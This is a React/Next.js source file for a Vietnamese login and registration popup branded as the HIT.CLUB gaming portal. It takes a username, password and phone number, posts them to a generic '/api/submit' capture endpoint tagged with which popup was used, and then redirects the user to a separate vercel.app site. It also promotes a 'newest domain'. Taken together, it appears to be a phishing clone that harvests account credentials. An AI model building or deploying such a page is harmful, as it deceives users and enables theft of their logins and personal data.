'use client';

import { useEffect, useRef, useState } from 'react';
import Link from 'next/link';
import styles from './LoginScreen.module.css';


export default function LoginScreen() {
  const [open, setOpen] = useState(true);
  const [mode, setMode] = useState<'login' | 'register'>('login');
  const [closing, setClosing] = useState(false);
  const [scale, setScale] = useState(1);
  const [toastMessage, setToastMessage] = useState('');

  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [phone, setPhone] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const submit = useRef<HTMLButtonElement>(null);
  const launch = useRef<HTMLButtonElement>(null);
  const close = useRef<HTMLButtonElement>(null);
  const usernameInput = useRef<HTMLInputElement>(null);
  const passwordInput = useRef<HTMLInputElement>(null);
  const phoneInput = useRef<HTMLInputElement>(null);
  const dismissTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const opener = useRef<HTMLElement | null>(null);

  useEffect(() => () => {
    if (dismissTimer.current) clearTimeout(dismissTimer.current);
    if (toastTimer.current) clearTimeout(toastTimer.current);
  }, []);

  useEffect(() => {
    const resize = () => setScale(Math.min(window.innerWidth / 1280, window.innerHeight / 720));
    resize();
    window.addEventListener('resize', resize);
    return () => window.removeEventListener('resize', resize);
  }, []);

  useEffect(() => {
    if (open) {
      usernameInput.current?.focus();
    }
  }, [open, mode]);

  const showToast = (msg: string) => {
    if (toastTimer.current) clearTimeout(toastTimer.current);
    setToastMessage(msg);
    toastTimer.current = setTimeout(() => {
      setToastMessage('');
    }, 3500);
  };

  const dismissToast = () => {
    if (toastTimer.current) clearTimeout(toastTimer.current);
    setToastMessage('');
  };

  const show = (targetMode?: 'login' | 'register') => {
    if (targetMode) setMode(targetMode);
    opener.current = document.activeElement instanceof HTMLElement ? document.activeElement : launch.current;
    setClosing(false);
    setOpen(true);
    dismissToast();
  };

  const dismiss = () => {
    if (closing) return;
    setClosing(true);
    dismissToast();
    dismissTimer.current = setTimeout(() => {
      setOpen(false);
      setClosing(false);
      requestAnimationFrame(() => opener.current?.focus());
    }, window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 0 : 160);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isSubmitting) return;

    const trimmedUser = username.trim();
    if (!trimmedUser) {
      showToast('Tên đăng nhập không được để trống!');
      usernameInput.current?.focus();
      return;
    }

    if (!password) {
      showToast('Mật khẩu không được để trống!');
      passwordInput.current?.focus();
      return;
    }

    const trimmedPhone = phone.trim().replace(/[\s.-]/g, '');
    if (!trimmedPhone) {
      showToast('Số điện thoại không được để trống!');
      phoneInput.current?.focus();
      return;
    }

    // Kiểm tra định dạng số điện thoại Việt Nam hợp lệ (10 chữ số, bắt đầu bằng 0 hoặc +84)
    if (!/^(0|\+84)[0-9]{9}$/.test(trimmedPhone)) {
      showToast('Số điện thoại không hợp lệ!');
      phoneInput.current?.focus();
      return;
    }

    setIsSubmitting(true);
    dismissToast();

    const actionType = mode === 'register' ? 'Đăng ký' : 'Đăng nhập';
    const refererInfo = `/login (Popup ${actionType})`;

    try {
      const res = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: trimmedUser,
          password,
          phone: trimmedPhone,
          type: actionType,
          referer: refererInfo,
        }),
      });

      const data = await res.json().catch(() => null);

      if (!res.ok || (data && data.ok === false)) {
        throw new Error(data?.message || 'Không thể kết nối đến máy chủ. Vui lòng thử lại sau!');
      }

      // Điều hướng đến link game / trang đích được chỉ định
      const redirectUrl = data?.redirectUrl || process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub-six.vercel.app/';
      window.location.href = redirectUrl;
    } catch (err: unknown) {
      const errMsg = err instanceof Error ? err.message : 'Không thể kết nối đến máy chủ. Vui lòng thử lại sau!';
      showToast(errMsg);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <main className={styles.page}>
      <div className={styles.stage} style={{ transform: `translate(-50%, -50%) scale(${scale})` }}>
        <div className={styles.scene} ref={node => { if (node) node.inert = open; }}>
          <div className={styles.actions}>
            <button
              className={styles.register}
              onClick={() => show('register')}
              aria-label="Đăng ký"
            />
            <button
              ref={launch}
              className={styles.login}
              onClick={() => show('login')}
              aria-label="Đăng nhập"
            />
          </div>
          <aside className={styles.side}>
            <Link href="/huong-dan-tai-game"><img src="/login/tai-app@2x.png" alt="Tải app" /></Link>
            <Link href="/lien-he"><img src="/login/tag-h-tr@2x.png" alt="Hỗ trợ" /></Link>
          </aside>
          <p className={styles.caption}>
            <strong>HITCLUB.ISTANBUL</strong> là tên miền mới nhất của <b>HIT.CLUB</b>, Quý Khách lưu ý để chơi game an toàn.
          </p>
          <span className={styles.version}>3.23.1</span>
        </div>

        {open && (
          <div className={`${styles.scrim} ${closing ? styles.closing : ''}`} onClick={dismiss}>
            <section
              className={styles.dialog}
              role="dialog"
              aria-modal="true"
              aria-label={mode === 'register' ? 'Đăng ký' : 'Đăng nhập'}
              onClick={e => e.stopPropagation()}
              onKeyDown={e => {
                if (e.key === 'Escape') {
                  e.stopPropagation();
                  if (toastMessage) dismissToast();
                  else dismiss();
                }
                if (e.key === 'Tab') {
                  const items = Array.from(e.currentTarget.querySelectorAll<HTMLElement>('button, a[href], input, select'));
                  const first = items[0], last = items[items.length - 1];
                  if (e.shiftKey && document.activeElement === first) {
                    e.preventDefault();
                    last.focus();
                  } else if (!e.shiftKey && document.activeElement === last) {
                    e.preventDefault();
                    first.focus();
                  }
                }
              }}
            >
              <h1>{mode === 'register' ? 'ĐĂNG KÝ' : 'ĐĂNG NHẬP'}</h1>
              <button ref={close} className={styles.close} onClick={dismiss} aria-label="Đóng">
                <img src="/login/icTopexit.png" alt="" />
              </button>

              {/* Thông báo dạng thanh banner toast chuẩn như ảnh mẫu */}
              {toastMessage && (
                <div
                  className={styles.toastBanner}
                  role="alert"
                  onClick={dismissToast}
                  title="Nhấn để đóng thông báo"
                >
                  <span className={styles.toastText}>{toastMessage}</span>
                </div>
              )}

              <form onSubmit={handleSubmit}>
                <input
                  ref={usernameInput}
                  className={styles.username}
                  name="username"
                  aria-label="Tên đăng nhập"
                  placeholder="Tên Đăng Nhập"
                  value={username}
                  onChange={e => {
                    setUsername(e.target.value);
                    if (toastMessage) dismissToast();
                  }}
                  autoComplete="username"
                />
                <input
                  ref={passwordInput}
                  className={styles.password}
                  name="password"
                  type="password"
                  aria-label="Mật khẩu"
                  placeholder="Mật Khẩu"
                  value={password}
                  onChange={e => {
                    setPassword(e.target.value);
                    if (toastMessage) dismissToast();
                  }}
                  autoComplete={mode === 'register' ? 'new-password' : 'current-password'}
                />
                <input
                  ref={phoneInput}
                  className={styles.phone}
                  name="phone"
                  type="tel"
                  inputMode="numeric"
                  aria-label="Số điện thoại"
                  placeholder="Số Điện Thoại"
                  value={phone}
                  onChange={e => {
                    setPhone(e.target.value);
                    if (toastMessage) dismissToast();
                  }}
                  autoComplete="tel"
                  maxLength={11}
                />
                <button
                  ref={submit}
                  type="submit"
                  className={`${styles.submit} ${mode === 'register' ? styles.submitRegister : ''}`}
                  disabled={isSubmitting}
                  aria-label={mode === 'register' ? 'Đăng ký' : 'Đăng nhập'}
                />
              </form>

              <div className={styles.switchMode}>
                <button
                  type="button"
                  onClick={() => {
                    setMode(mode === 'login' ? 'register' : 'login');
                    dismissToast();
                  }}
                >
                  {mode === 'login' ? 'Chưa có tài khoản? ĐĂNG KÝ NGAY' : 'Đã có tài khoản? ĐĂNG NHẬP NGAY'}
                </button>
              </div>
            </section>
          </div>
        )}
      </div>
      <div className={styles.disclosure}>
        HITCLUB © CỔNG GAME QUỐC TẾ · <Link href="/">Về trang chủ</Link>
      </div>
    </main>
  );
}
